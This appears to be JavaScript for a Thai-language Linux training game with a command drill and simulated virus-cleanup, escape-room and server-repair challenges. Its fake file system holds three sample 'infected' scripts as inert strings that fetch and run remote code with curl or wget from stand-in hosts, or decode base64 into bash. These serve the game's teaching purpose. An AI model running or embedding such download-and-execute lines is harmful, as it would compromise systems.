(function () {
  'use strict';
  const cfg = window.LQ_GAME;
  const T = window.LinuxQuestTerminal;
  const d = T.d, f = T.f, C = T.COLORS;

  function saveScore(score, timeTakenSec, xp) {
    return fetch(cfg.base + '/api/save_game_score.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: cfg.code, score, time_taken_sec: timeTakenSec, xp, csrf_token: cfg.csrf }),
    }).catch(() => {});
  }

  // ---------------------------------------------------------------- drill
  function initDrill() {
    const pool = cfg.drills.slice().sort(() => Math.random() - 0.5).slice(0, 12);
    const startedAt = Date.now();
    const deadline = startedAt + 90000;
    let idx = 0, score = 0, correct = 0, combo = 0;
    const results = [];
    let finished = false;

    const barEl = document.getElementById('drillBar');
    const numEl = document.getElementById('drillNum');
    const promptEl = document.getElementById('drillPromptText');
    const hintEl = document.getElementById('drillHintText');
    const inputEl = document.getElementById('drillInput');
    const fbEl = document.getElementById('drillFeedback');
    const dotsEl = document.getElementById('drillDots');
    const liveEl = document.getElementById('drillLive');
    const overEl = document.getElementById('drillOver');
    const hud = document.getElementById('gameHud');

    function renderHud(left) {
      hud.innerHTML =
        '<div class="game-hud"><div class="label">คะแนน</div><div class="value" style="color:var(--green)">' + score + '</div></div>' +
        '<div class="game-hud"><div class="label">เวลา</div><div class="value" style="color:' + (left < 20 ? 'var(--red)' : 'var(--fg)') + '">' + left + 's</div></div>';
    }

    function renderDots() {
      dotsEl.innerHTML = '';
      pool.forEach((p, i) => {
        const s = document.createElement('span');
        s.className = 'drill-dot' + (results[i] ? (results[i].ok ? ' ok' : ' bad') : (i === idx ? ' cur' : ''));
        dotsEl.appendChild(s);
      });
    }

    function renderQuestion() {
      const q = pool[idx];
      numEl.textContent = 'โจทย์ที่ ' + (idx + 1) + ' / ' + pool.length + ' · พิมพ์คำสั่งให้ถูกต้อง';
      promptEl.textContent = q.p;
      hintEl.textContent = 'คำใบ้: ' + q.h;
      inputEl.value = '';
      fbEl.textContent = '';
      renderDots();
    }

    function finish() {
      finished = true;
      clearInterval(timer);
      liveEl.style.display = 'none';
      overEl.style.display = '';
      document.getElementById('drillFinalScore').textContent = score;
      document.getElementById('drillFinalScore').style.color = correct >= 9 ? C.GREEN : C.AMBER;
      document.getElementById('drillFinalCorrect').textContent = 'คะแนน · ถูก ' + correct + ' จาก ' + pool.length + ' ข้อ';
      document.getElementById('drillFinalMsg').textContent = correct >= 10 ? 'เร็วและแม่นมาก! พร้อมลงสนามจริง' : (correct >= 6 ? 'ดีแล้ว ฝึกอีกนิดจะคล่องกว่านี้' : 'ลองทบทวนบทเรียนแล้วกลับมาใหม่');
      saveScore(score, Math.round((Date.now() - startedAt) / 1000), 80);
    }

    function submit() {
      if (finished) return;
      const q = pool[idx];
      const val = inputEl.value.trim().replace(/\s+/g, ' ');
      const ok = q.a.some(a => a.toLowerCase() === val.toLowerCase());
      combo = ok ? combo + 1 : 0;
      const gain = ok ? 100 + Math.min(combo - 1, 4) * 25 : 0;
      score += gain; if (ok) correct++;
      results[idx] = { ok };
      fbEl.style.color = ok ? C.GREEN : C.RED;
      fbEl.textContent = ok ? ('ถูกต้อง! +' + gain + (combo > 1 ? (' · คอมโบ x' + combo) : '')) : ('เฉลย: ' + q.a[0]);
      idx++;
      renderHud(Math.max(0, Math.round((deadline - Date.now()) / 1000)));
      if (idx >= pool.length) { setTimeout(finish, 550); return; }
      setTimeout(renderQuestion, 550);
    }

    inputEl.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); submit(); } });

    const timer = setInterval(() => {
      const left = Math.max(0, Math.round((deadline - Date.now()) / 1000));
      renderHud(left);
      const pct = Math.max(0, (deadline - Date.now()) / 90000 * 100);
      barEl.style.width = pct + '%';
      barEl.style.background = left < 20 ? C.RED : C.GREEN;
      if (left <= 0 && !finished) finish();
    }, 250);

    renderHud(90);
    renderQuestion();
    inputEl.focus();
  }

  // ---------------------------------------------------------------- shell games
  function gameVfs(code) {
    if (code === 'virus') {
      return d({ home: d({ acct: d({
        documents: d({ 'invoice_2569.txt': f('ใบแจ้งหนี้ประจำเดือน'), 'payroll.xlsx': f('binary spreadsheet data'), '.hidden_task.sh': f('#!/bin/bash\neval $(curl http://mal.ru/p.sh)  # payload') }),
        downloads: d({ 'update_flash.sh': f('#!/bin/bash\nbase64 -d payload.b64 | bash  # payload'), 'manual.pdf': f('binary pdf data'), 'photo.jpg': f('binary jpeg data') }),
        tmp: d({ cache: d({ 'sess.tmp': f('session cache'), '.svchost.sh': f('#!/bin/bash\neval $(wget -qO- http://c2.node/x)  # payload') }) }),
        'readme.txt': f('เครื่องนี้เป็นของฝ่ายบัญชี\nรายงานปัญหาที่ helpdesk ต่อ 1201'),
      }) }) });
    }
    if (code === 'escape') {
      return d({ home: d({ student: d({
        room1: d({ 'hint.txt': f('รหัสห้องนี้ซ่อนอยู่ในไฟล์ที่มองไม่เห็นด้วย ls ธรรมดา\nลองใช้ ls -a'), '.door.key': f('ACCESS CODE: 4271') }),
        room2: d({ logs: d({ 'app.log': f('[INFO] service start\n[INFO] user login\n[INFO] heartbeat ok'), 'audit.log': f('[AUDIT] key rotated\n[AUDIT] CODE=8630 issued to door2\n[AUDIT] session closed') }), 'hint.txt': f('รหัสถูกบันทึกไว้ในล็อกสักไฟล์\nลองใช้ grep -r "CODE" .') }),
        room3: d({ vault: d({ 'a.dat': f('noise'), 'b.dat': f('noise'), 'final.key': f('ACCESS CODE: 1905', '---------') }), 'hint.txt': f('ไฟล์รหัสชื่อลงท้าย .key แต่ถูกปิดสิทธิ์อ่านไว้\nใช้ find หาให้เจอ แล้ว chmod 600 ก่อนอ่าน') }),
        'welcome.txt': f('ยินดีต้อนรับสู่ห้องหนีตาย\nเริ่มที่ cd room1 แล้วหารหัส 4 หลัก\nเปิดประตูด้วย door --open <รหัส>'),
      }) }) });
    }
    return d({ home: d({ student: d({
      var: d({ www: d({}) }),
      etc: d({ 'app.conf': f('port=8080\nroot=/var/www', 'rw-rw-rw-') }),
      tmp: d({ 'index.html': f('<h1>Welcome</h1>'), 'start.sh': f('#!/bin/bash\nnginx -g daemon off;', 'rw-r--r--') }),
      'db_password.txt': f('root:S3cr3t!', 'rw-rw-rw-'),
    }) }) });
  }

  const META = {
    virus: {
      home: ['home', 'acct'],
      intro: [{ text: 'AV-CLI 2.4 — ระบบเฝ้าระวังภัยคุกคาม', color: C.CYAN }, { text: 'แจ้งเตือน: เครื่อง acct-01 พบไฟล์ติดเชื้อ 3 ไฟล์ กรุณาค้นหาและกำจัด', color: C.RED }, { text: 'พิมพ์ help เพื่อดูคำสั่ง หรือ av --scan . เพื่อเริ่มสแกน', color: C.MUT }],
      toolLine: 'av --scan · av --check · av --clean',
      tools: [
        { cmd: 'av --scan <path>', desc: 'สแกนโฟลเดอร์ที่ระบุ บอกว่ามีไฟล์ติดเชื้อกี่ไฟล์ (ไม่บอกชื่อ)' },
        { cmd: 'av --check <ไฟล์>', desc: 'ตรวจไฟล์เดียวว่าติดเชื้อหรือไม่' },
        { cmd: 'av --clean <ไฟล์>', desc: 'กำจัดไวรัสในไฟล์ที่ระบุ ต้องระบุไฟล์ที่ติดเชื้อจริงเท่านั้น' },
        { cmd: 'grep -r "eval" .', desc: 'เบาะแส: โค้ดอันตรายมักมีคำว่า eval, curl หรือ base64' },
      ],
      hints: ['ls', 'av --scan .', 'grep -r "eval" .', 'cd ..'],
    },
    escape: {
      home: ['home', 'student'],
      intro: [{ text: 'ESCAPE — ระบบล็อก 3 ชั้น', color: C.CYAN }, { text: 'อ่าน welcome.txt ก่อนเริ่ม แล้ว cd room1', color: C.MUT }],
      toolLine: 'door --open · door --status',
      tools: [
        { cmd: 'door --open <รหัส>', desc: 'ใส่รหัส 4 หลักเพื่อเปิดประตูห้องปัจจุบัน' },
        { cmd: 'door --status', desc: 'ดูว่าตอนนี้อยู่ห้องไหน และเหลืออีกกี่ห้อง' },
        { cmd: 'find . -name "*.key"', desc: 'รหัสมักซ่อนอยู่ในไฟล์แปลก ๆ ลองค้นหลายนามสกุล' },
        { cmd: 'ls -a', desc: 'อย่าลืมไฟล์ซ่อนที่ขึ้นต้นด้วยจุด' },
      ],
      hints: ['ls -a', 'find . -name "*.key"', 'cat hint.txt', 'door --status'],
    },
    repair: {
      home: ['home', 'student'],
      intro: [{ text: 'SYS-CHECK — เซิร์ฟเวอร์ web-02 หยุดทำงาน', color: C.CYAN }, { text: 'พิมพ์ sys --check เพื่อดูรายการที่ต้องแก้', color: C.MUT }],
      toolLine: 'sys --check',
      tools: [
        { cmd: 'sys --check', desc: 'ตรวจสุขภาพระบบ บอกว่ายังเหลืออะไรต้องแก้' },
        { cmd: 'mv <ไฟล์> <ปลายทาง>', desc: 'ย้ายไฟล์กลับตำแหน่งที่ถูกต้อง' },
        { cmd: 'chmod 755 <ไฟล์>', desc: 'ตั้งสิทธิ์ให้ไฟล์รันได้' },
        { cmd: 'chmod 600 <ไฟล์>', desc: 'ตั้งสิทธิ์ไฟล์ลับให้เจ้าของเท่านั้นที่เข้าถึงได้' },
      ],
      hints: ['sys --check', 'ls -l', 'ls -l tmp', 'cd ..'],
    },
  };

  function initShell() {
    const code = cfg.code;
    const meta = META[code];
    if (!meta) return;
    const startedAt = Date.now();
    const deadline = cfg.timeLimitSec ? startedAt + cfg.timeLimitSec * 1000 : 0;

    const term = new T.Terminal(gameVfs(code), meta.home.slice());
    term.toolLine = meta.toolLine;

    // paidFixes = จำนวนข้อของเกม repair ที่จ่ายคะแนนไปแล้ว กัน sys --check ซ้ำแล้วได้คะแนนซ้ำ
    const state = { score: 0, cleaned: [], room: 0, fixed: 0, paidFixes: 0, won: false };

    term.custom = function (cmd, args, rest, flags, cwd, push) {
      if (cmd === 'av') {
        if (code !== 'virus') { push('bash: av: command not found', C.RED); return true; }
        const mode = args[0];
        if (mode === '--scan') {
          const start = term.resolve(cwd, rest[1] || rest[0] || '.'); const n = term.node(start);
          if (!n) { push('av: path not found', C.RED); return true; }
          let found = 0, scanned = 0;
          const walk = x => { if (x.t === 'f') { scanned++; if (/payload/.test(x.c || '')) found++; return; } Object.keys(x.ch).forEach(k => walk(x.ch[k])); };
          walk(n);
          push('AV-CLI 2.4 · เริ่มสแกน ' + (rest[1] || rest[0] || '.'), C.CYAN);
          push('  สแกนแล้ว ' + scanned + ' ไฟล์', C.DIM);
          push(found ? ('  !! พบไฟล์ติดเชื้อ ' + found + ' ไฟล์ในเส้นทางนี้') : '  ✓ ไม่พบสิ่งผิดปกติในเส้นทางนี้', found ? C.RED : C.GREEN);
          if (found) push('  ใช้ av --check <ไฟล์> เพื่อระบุไฟล์ หรือ grep -r "eval" . เพื่อหาเบาะแส', C.MUT);
          return true;
        }
        if (mode === '--check') {
          const t = rest[1] || rest[0]; const n = term.node(term.resolve(cwd, t));
          if (!n || n.t !== 'f') { push('av: ' + t + ': ไม่พบไฟล์', C.RED); return true; }
          const bad = /payload/.test(n.c || '');
          push(bad ? ('  !! ' + t + ' ติดเชื้อ: Trojan.Shell.Downloader') : ('  ✓ ' + t + ' ปลอดภัย'), bad ? C.RED : C.GREEN);
          return true;
        }
        if (mode === '--clean') {
          const t = rest[1] || rest[0]; const path = term.resolve(cwd, t); const n = term.node(path);
          if (!n || n.t !== 'f') { push('av: ' + t + ': ไม่พบไฟล์', C.RED); return true; }
          if (!/payload/.test(n.c || '')) { push('  ไฟล์นี้ไม่ติดเชื้อ การลบไฟล์ดีจะเสียคะแนน -50', C.AMBER); state.score = Math.max(0, state.score - 50); return true; }
          const par = term.node(path.slice(0, -1)); delete par.ch[path[path.length - 1]];
          state.cleaned.push(path[path.length - 1]); state.score += 200;
          push('  ✓ กำจัด ' + t + ' สำเร็จ (+200 คะแนน)', C.GREEN);
          push('  กำจัดแล้ว ' + state.cleaned.length + ' / 3 ไฟล์', state.cleaned.length === 3 ? C.GREEN : C.AMBER);
          return true;
        }
        push('ใช้: av --scan <path> | av --check <ไฟล์> | av --clean <ไฟล์>', C.DIM); return true;
      }
      if (cmd === 'door') {
        if (code !== 'escape') { push('bash: door: command not found', C.RED); return true; }
        const CODES = ['4271', '8630', '1905'];
        if (args[0] === '--status') { push('ห้องปัจจุบัน: room' + (state.room + 1) + ' · เหลืออีก ' + (3 - state.room) + ' ห้อง', C.CYAN); return true; }
        if (args[0] === '--open') {
          const codeArg = rest[1] || rest[0];
          if (codeArg === CODES[state.room]) {
            state.room++; state.score += 250;
            push('  ✓ ประตูห้อง ' + state.room + ' เปิดแล้ว! (+250 คะแนน)', C.GREEN);
            if (state.room < 3) push('  เดินต่อไปที่ room' + (state.room + 1) + ' ด้วย cd ~/room' + (state.room + 1), C.CYAN);
            return true;
          }
          push('  ✗ รหัสไม่ถูกต้อง ลองอ่านไฟล์ hint.txt ในห้องนี้อีกครั้ง', C.RED);
          state.score = Math.max(0, state.score - 25);
          return true;
        }
        push('ใช้: door --open <รหัส 4 หลัก> | door --status', C.DIM); return true;
      }
      if (cmd === 'sys') {
        if (code !== 'repair') { push('bash: sys: command not found', C.RED); return true; }
        const S = p => term.node(['home', 'student'].concat(p));
        const checks = [
          { ok: !!S(['var', 'www', 'index.html']), bad: 'หน้าเว็บหลัก index.html ต้องอยู่ใน var/www (ตอนนี้อยู่ผิดที่)', good: 'index.html อยู่ที่ var/www แล้ว' },
          { ok: !!S(['var', 'www', 'start.sh']) && S(['var', 'www', 'start.sh']).p.indexOf('x') > -1, bad: 'start.sh ต้องอยู่ใน var/www และตั้งสิทธิ์ให้รันได้ (chmod 755)', good: 'start.sh พร้อมรันแล้ว' },
          { ok: !!S(['db_password.txt']) && S(['db_password.txt']).p === 'rw-------', bad: 'db_password.txt เปิดให้ทุกคนอ่านเขียนได้ — ต้อง chmod 600', good: 'db_password.txt ปลอดภัยแล้ว' },
          { ok: !!S(['etc', 'app.conf']) && S(['etc', 'app.conf']).p === 'rw-r--r--', bad: 'etc/app.conf สิทธิ์กว้างเกินไป — ต้อง chmod 644', good: 'app.conf สิทธิ์ถูกต้องแล้ว' },
        ];
        push('SYS-CHECK · web-02', C.CYAN);
        checks.forEach(c => push('  [' + (c.ok ? 'OK ' : 'FAIL') + '] ' + (c.ok ? c.good : c.bad), c.ok ? C.GREEN : C.RED));
        const fixed = checks.filter(c => c.ok).length;
        push('  ผ่าน ' + fixed + ' / 4 ข้อ', fixed === 4 ? C.GREEN : C.AMBER);
        state.fixed = fixed;

        // ให้คะแนนตามจำนวนข้อที่ซ่อมได้ นับเฉพาะข้อที่ยังไม่เคยจ่าย
        if (fixed > state.paidFixes) {
          const gained = (fixed - state.paidFixes) * 200;
          state.score += gained;
          state.paidFixes = fixed;
          push('  +' + gained + ' คะแนน', C.GREEN);
        }
        return true;
      }
      return false;
    };

    const linesEl = document.getElementById('termLines');
    const inputEl = document.getElementById('termInput');
    const promptEl = document.getElementById('termPrompt');
    const treeBox = document.getElementById('treeBox');
    const treePath = document.getElementById('treePath');
    const hud = document.getElementById('gameHud');
    const objEl = document.getElementById('gameObjectives');
    const toolsEl = document.getElementById('gameTools');
    const hintsEl = document.getElementById('termHints');
    const winBox = document.getElementById('winBox');
    const winMsg = document.getElementById('winMsg');

    function esc(s) { const div = document.createElement('div'); div.textContent = s; return div.innerHTML; }
    function appendLines(newLines) { newLines.forEach(l => { const div = document.createElement('div'); div.style.color = l.color; div.textContent = l.text; linesEl.appendChild(div); }); linesEl.scrollTop = linesEl.scrollHeight; }
    function renderPrompt() { const disp = term.disp(term.cwd); promptEl.textContent = disp + ' $'; }
    function renderTree() {
      treePath.textContent = '/' + term.cwd.join('/');
      treeBox.innerHTML = '';
      term.treeRows().forEach(r => {
        const row = document.createElement('div');
        row.className = 'tree-row' + (r.isCwd ? ' cur' : '');
        row.style.paddingLeft = (8 + r.depth * 15) + 'px';
        row.innerHTML = '<span style="width:9px;display:inline-block">' + r.glyph + '</span><span>' + esc(r.name) + '</span>';
        treeBox.appendChild(row);
      });
    }
    function renderTools() {
      toolsEl.innerHTML = '';
      meta.tools.forEach(t => {
        const box = document.createElement('div'); box.className = 'tool-card';
        box.innerHTML = '<code>' + esc(t.cmd) + '</code><div class="desc">' + esc(t.desc) + '</div>';
        toolsEl.appendChild(box);
      });
    }
    function renderHints() {
      hintsEl.querySelectorAll('.hint-chip').forEach(el => el.remove());
      meta.hints.forEach(h => {
        const chip = document.createElement('span'); chip.className = 'hint-chip'; chip.textContent = h;
        chip.addEventListener('click', () => { inputEl.value = h; runCurrent(); });
        hintsEl.appendChild(chip);
      });
    }

    function objectives() {
      if (code === 'virus') return [
        ['สแกนหาเส้นทางที่มีไฟล์ติดเชื้อด้วย av --scan', term.history.some(c => /av\s+--scan/.test(c))],
        ['ระบุไฟล์ต้องสงสัยด้วย grep หรือ av --check', term.history.some(c => /grep|av\s+--check/.test(c))],
        ['กำจัดไฟล์ติดเชื้อครบ 3 ไฟล์ (' + state.cleaned.length + '/3)', state.cleaned.length >= 3],
      ];
      if (code === 'escape') return [
        ['เปิดประตูห้องที่ 1 (รหัสอยู่ในไฟล์ซ่อน)', state.room >= 1],
        ['เปิดประตูห้องที่ 2 (รหัสอยู่ในล็อก)', state.room >= 2],
        ['เปิดประตูห้องที่ 3 (ต้อง chmod ก่อนอ่าน)', state.room >= 3],
      ];
      return [
        ['รัน sys --check เพื่อดูรายการที่พัง', term.history.some(c => /sys\s+--check/.test(c))],
        ['ย้ายไฟล์เว็บกลับ var/www ให้ครบ', state.fixed >= 2],
        ['แก้สิทธิ์ไฟล์ให้ถูกต้องทั้งหมด (ผ่าน ' + state.fixed + '/4)', state.fixed >= 4],
      ];
    }

    function renderObjectives() {
      objEl.innerHTML = '';
      objectives().forEach(([label, ok]) => {
        const row = document.createElement('div');
        row.style.cssText = 'display:flex;gap:10px;align-items:flex-start;padding:10px 12px;border-radius:9px;background:' + (ok ? 'rgba(74,222,128,.07)' : 'rgba(255,255,255,.022)') + ';border:1px solid ' + (ok ? 'rgba(74,222,128,.22)' : 'rgba(255,255,255,.05)');
        row.innerHTML = '<span style="flex:none;width:16px;height:16px;border-radius:5px;border:1px solid ' + (ok ? C.GREEN : 'rgba(255,255,255,.18)') + ';background:' + (ok ? C.GREEN : 'transparent') + ';display:flex;align-items:center;justify-content:center;font-size:10px;color:#04150b">' + (ok ? '✓' : '') + '</span><span style="flex:1;font-size:12.5px;line-height:1.55;color:' + (ok ? '#a9d9bb' : '#93a8a1') + '">' + esc(label) + '</span>';
        objEl.appendChild(row);
      });
    }

    function renderHud() {
      const left = deadline ? Math.max(0, Math.round((deadline - Date.now()) / 1000)) : null;
      let html = '<div class="game-hud"><div class="label">คะแนน</div><div class="value" style="color:var(--green)">' + state.score + '</div></div>';
      if (code === 'virus') html += '<div class="game-hud"><div class="label">กำจัดแล้ว</div><div class="value" style="color:' + (state.cleaned.length >= 3 ? 'var(--green)' : 'var(--amber)') + '">' + state.cleaned.length + '/3</div></div>';
      if (code === 'escape') html += '<div class="game-hud"><div class="label">ห้อง</div><div class="value" style="color:var(--cyan)">' + Math.min(state.room + 1, 3) + '/3</div></div>';
      if (code === 'repair') html += '<div class="game-hud"><div class="label">ซ่อมแล้ว</div><div class="value" style="color:' + (state.fixed >= 4 ? 'var(--green)' : 'var(--amber)') + '">' + state.fixed + '/4</div></div>';
      if (left !== null) html += '<div class="game-hud"><div class="label">เวลา</div><div class="value" style="color:' + (left < 60 ? 'var(--red)' : 'var(--fg)') + '">' + String(Math.floor(left / 60)) + ':' + String(left % 60).padStart(2, '0') + '</div></div>';
      hud.innerHTML = html;
    }

    function checkWin() {
      if (state.won) return;
      let won = false;
      if (code === 'virus') won = state.cleaned.length >= 3;
      if (code === 'escape') won = state.room >= 3;
      if (code === 'repair') won = state.fixed >= 4;
      if (!won) return;
      state.won = true;
      const left = deadline ? Math.max(0, Math.round((deadline - Date.now()) / 1000)) : 0;
      // เกมที่ไม่มีลิมิตเวลาไม่มีโบนัสเวลา จึงให้โบนัสจบภารกิจแทน ไม่งั้นคะแนนจะดูขาด ๆ
      const bonus = deadline ? left * 3 : 100;
      state.score += bonus;
      winMsg.textContent = 'ได้ ' + state.score + ' คะแนน +120 XP' + (code === 'virus' ? ' — ระบบสะอาดแล้ว' : '');
      winBox.style.display = '';
      inputEl.disabled = true;
      if (timer) clearInterval(timer);
      saveScore(state.score, Math.round((Date.now() - startedAt) / 1000), 120);
    }

    function runCurrent() {
      const raw = inputEl.value;
      const before = term.disp(term.cwd);
      const r = term.run(raw);
      if (r.clear) linesEl.innerHTML = '';
      else appendLines([{ text: before + ' $ ' + raw, color: C.GREEN }].concat(r.out));
      inputEl.value = '';
      renderPrompt(); renderTree(); renderObjectives(); renderHud(); checkWin();
    }

    inputEl.addEventListener('keydown', e => {
      if (e.key === 'Enter') { e.preventDefault(); runCurrent(); }
      else if (e.key === 'Tab') { e.preventDefault(); const res = term.complete(inputEl.value, code === 'virus' ? ['av'] : code === 'escape' ? ['door'] : ['sys']); if (res) inputEl.value = res.filled; }
    });
    document.getElementById('gameTermWrap').addEventListener('click', () => inputEl.focus());

    let timer = null;
    if (deadline) {
      timer = setInterval(() => {
        renderHud();
        if (Date.now() >= deadline && !state.won) { clearInterval(timer); inputEl.disabled = true; appendLines([{ text: 'หมดเวลา! ลองใหม่อีกครั้ง', color: C.RED }]); }
      }, 250);
    }

    appendLines(meta.intro);
    renderPrompt(); renderTree(); renderObjectives(); renderTools(); renderHints(); renderHud();
    inputEl.focus();
  }

  if (cfg.code === 'drill') initDrill(); else initShell();
})();
